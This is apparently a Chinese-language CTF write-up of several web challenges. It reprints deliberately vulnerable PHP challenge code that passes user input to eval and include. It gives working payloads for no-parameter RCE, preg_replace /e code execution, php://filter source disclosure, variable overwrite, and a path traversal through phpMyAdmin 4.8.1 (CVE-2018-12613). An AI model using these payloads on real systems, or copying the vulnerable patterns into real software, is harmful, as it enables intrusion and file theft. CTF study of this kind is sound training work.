class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>REMOTE_ADDR 是你的客户端跟你的服务器“握手”时候的IP。如果使用了“匿名代理”，REMOTE_ADDR将显示代理服务器的IP。</strong><br>HTTP_CLIENT_IP 是代理服务器发送的HTTP头。如果是“超级匿名代理”，则返回none值。同样，REMOTE_ADDR也会被替换为这个代理服务器的IP。<br><strong>$_SERVER[‘REMOTE_ADDR’]; //访问端（有可能是用户，有可能是代理的）IP</strong>$<strong>_SERVER[‘HTTP_CLIENT_IP’]; //代理端的（有可能存在，可伪造）<br>$_SERVER[‘HTTP_X_FORWARDED_FOR’]; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）</strong></p><p><a href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">这篇文章讲的透彻</a></p><p><a href="https://paper.seebug.org/164/">escapeshellarg()和escapeshellcmd()</a></p><p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">这篇wp写的非常详细，我这里就不写了</a></p><p>对于这些转义字符和那两个函数执行的过程，认真看看就能明白了</p><p><img src="../images/image-20230406202802386.png" alt="image-20230406202802386"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>题目</p><p><img src="../images/image-20230406202925322.png" alt="image-20230406202925322"></p><p>没啥东西，但是扫目录的时候发现了</p><p><img src="../images/image-20230406203421874.png" alt="image-20230406203421874"></p><p>这四个git东西，但是都下载下来没看到啥有用的信息，然后我们就去看看其相对应的工具来看看能不能拿到什么有用的信息</p><p>尝试使用 <a href="https://so.csdn.net/so/search?q=GitHack&amp;spm=1001.2101.3001.7020">GitHack</a> 看看是不是源码泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/GitHack</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204017689.png" alt="image-20230406204017689"></p><p><img src="../images/image-20230406204033529.png" alt="image-20230406204033529"></p><p><img src="../images/image-20230406204049843.png" alt="image-20230406204049843"></p><p>拿到了源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406204529234.png" alt="image-20230406204529234"></p><p>扒下了网站的源码<br>好了，现在就是代码审计了<br>最吸引眼球的就是 eval的一句话木马，题目又加了好多过滤限制了REC<br>首先是 php伪协议 data协议 filter协议 都不能使用了<br>然后该网站使用了正则匹配 其实这就是无参数的rce</p><p>如果如果’;’===preg<em>replace(…)，那么就执行exp传递的命令<br>**(?R)? : (?R)代表当前表达式，就是这个(/[a-z,</em>]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)<em>则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))*</em></p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code>这个就是得要求传入的exp得全部杯匹配进行替换，替换只剩下     <strong>；</strong>才行，和题目说的一样   —-&gt;   <strong>套娃</strong></p><p>无参数REC 一般有三种绕过姿势：</p><ul><li><strong>gettallheaders（）</strong></li><li><strong>get_defined_vars()</strong></li><li><strong>session_id()</strong><br><strong>具体可以<a href="https://blog.csdn.net/Manuffer/article/details/120738755">参考博客</a></strong></li></ul><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</span><br></pre></td></tr></table></figure><p><strong>原理</strong></p><p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。<br><img src="../images/image-20230406205415420.png" alt="image-20230406205415420"></p><p><strong>方法二</strong><br>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取/设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file( session_id(session_start()));</span><br></pre></td></tr></table></figure><p>session_id(session_start())<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。<br><img src="../images/image-20230406205748900.png" alt="image-20230406205748900"></p><p><strong>PHPSESSID来找到服务端的session文件，通过对这个session文件的读写操作即实现了session的超全局变量属性</strong></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我想到伪协议的原因是因为访问next.php的时候，访问不了，而且这里还是个include</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line">data:<span class="comment">//text/plain,..(注意抓包的时候，$text参数里的空格是%20)   这个伪协议也行</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406212130699.png" alt="image-20230406212130699"></p><p>拿到了next.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里主要涉及到<code>preg_replace</code>的一个RCE漏洞   <a href="https://xz.aliyun.com/t/2557">preg_replaceRCE</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>主要就是构造<code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;此处填函数名&#125;&#125;);</code><br>大概就是把所有字符替换为函数执行结果。<br>但是GET传<code>.*=xxx</code>会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//755f7227-48c2-4d56-91a8-c2c6b5518680.node3.buuoj.cn/next.php?\S*=$&#123;eval($_POST[cmd])&#125;</span></span><br></pre></td></tr></table></figure><p>同时post一个<code>cmd=system(&quot;cat /flag&quot;);</code></p><p>\S*表示连续匹配多个非空白字符</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;<span class="title function_ invoke__">getFlag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>题目</p><p>考点：phpadmin 4.8.1远程<a href="https://so.csdn.net/so/search?q=文件包含漏洞&amp;spm=1001.2101.3001.7020">文件包含漏洞</a>（CVE-2018-12613）</p><p><img src="../images/image-20230406225519111.png" alt="image-20230406225519111"></p><p>这里扫目录扫出来phpmyadmin</p><p><img src="../images/image-20230406225757816.png" alt="image-20230406225757816"></p><p>看到版本号</p><p><a href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</a></p><p><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a></p><p>上面的两个链接是对这个漏洞的讲解，简单来说，就是这个漏洞的源文件（index.php）存在解码漏洞，源码内对url进行了？的分割，在分割前，又对参数进行了urldecode,且如果?号前面的文件就是taget在白名单里，就可以绕过，这样我们一是令target=db_sql.php，而是在传参使对?进行二次url编码，即?变为%253f</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406230040730.png" alt="image-20230406230040730"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>题目</p><p><img src="../images/image-20230406230218432.png" alt="image-20230406230218432"></p><p>是一个网站</p><p>扫一下网址发现/.git    然后猜测是不是git源码泄露</p><p>用GitHack来测试一下</p><p>发现存在源码泄露</p><p><img src="../images/image-20230406231502698.png" alt="image-20230406231502698"></p><p>然后读取得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　　</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post 声明至当前文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;　 <span class="comment">//传入的变量为flag   value不是flag</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;   </span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>exit 输出一条消息，并退出当前脚本</strong></p><p><img src="../images/image-20230407204057358.png" alt="image-20230407204057358"></p><p>我们进行代码审计 在这关我们绕过三个 if 函数 直接echo 明显不现实 所以突破点就是那三个 exit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上面我们要想绕过 需要</span><br><span class="line"></span><br><span class="line">get中参数必须含有 $ x 同时$ x不能含有flag</span><br><span class="line">存在get参数 或者 存在post参数</span><br><span class="line">post参数恒等于  flag 或者 get参数恒等于 falg</span><br><span class="line">当我们到达最后的时候fal也被重置了</span><br></pre></td></tr></table></figure><p>可变变量：如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量之前再多加一个 $ 符号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>; </span><br><span class="line"><span class="comment">// 输出 bb   1.找到 $a,解析结果：b    2.找到$b,解析结果 bb</span></span><br></pre></td></tr></table></figure><p>本关的核心代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　　</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>  ;  <span class="comment">//post 声明至当前文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> x =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以利用 foreach 进行变量重覆盖</p><p>在这一关可以执行输出内容地方有两个函数 exit 和 echo</p><p>第一个 exit（最后讲）</p><p><strong>第二个 exit——覆盖 yds</strong><br>我们的思路就是让flag变量覆盖到yds上，在执行exit($yds);<br>的时候输出flag</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;　　　 </span><br><span class="line">   <span class="variable">$$x</span> = <span class="variable">$$y</span>;  <span class="comment">//GET型变量重新赋值为当前文件变量中以其值&gt;为键名的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他输出<code>$yds</code>。我们只需让<code>$yds=$flag</code>就好了<br>由于我们输入的变量是yds=flag<br>所以<code>$x</code>=yds <code>$y</code>=flag<br><code>$$x</code>= <code>$$y</code> 所以 <code>$yds=$flag</code><br>flag变量就是 我们要的东西<br>exit($yds)。就是echo $flag。</p><p><strong>第三个——覆盖 is</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>前半段和前面的方法原理相同，让flag覆盖is<br>后面的<code>flag=flag</code>—&gt;<code>$flag</code>=<code>$flag</code> 目的是为了符合第三个if需求：<code>（$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;)</code><br>进而输出 flag</p><p><strong>第一个——覆盖handsome</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></figure><p>handsome=flag不用说 就是让<code>$handsome</code>=<code>$flag</code><br>后面的目的就是让我们传入的变量是 flag 值不是flag 进而能够exit handsome</p><blockquote><p>这里的值表面是 x 但前面我们进行了变量覆盖使得 x=flag 所以在这里我们输出x的值就是flag的值</p></blockquote><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>题目</p><p><img src="../images/image-20230407205459073.png" alt="image-20230407205459073"></p><p>发现他的url有点猫腻</p><p><img src="../images/image-20230407205741174.png" alt="image-20230407205741174"></p><p>一个img一个cmd</p><p>把img里面的东西进行解码查看一下</p><p><img src="../images/image-20230407205834321.png" alt="image-20230407205834321"></p><p>经过两次base64和一次16进制解码得到   那么我们可以尝试一下进行index.php的查看   逆着编码就行了</p><p>查看源码，并进行base64解码得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ 